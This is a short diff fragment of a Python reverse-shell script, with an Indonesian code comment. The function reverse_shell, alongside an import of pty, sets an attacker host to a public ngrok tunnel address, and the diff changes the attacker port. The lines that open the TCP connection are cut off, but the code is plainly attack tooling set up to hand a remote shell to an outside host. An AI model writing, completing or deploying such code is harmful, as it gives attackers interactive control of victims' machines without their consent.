@@ -8,7 +8,7 @@ import pty
 
 def reverse_shell():
     attacker_host = "0.tcp.ap.ngrok.io"
-    attacker_port = 19347
+    attacker_port = 13270
 
     try:
         # Membuat socket TCP
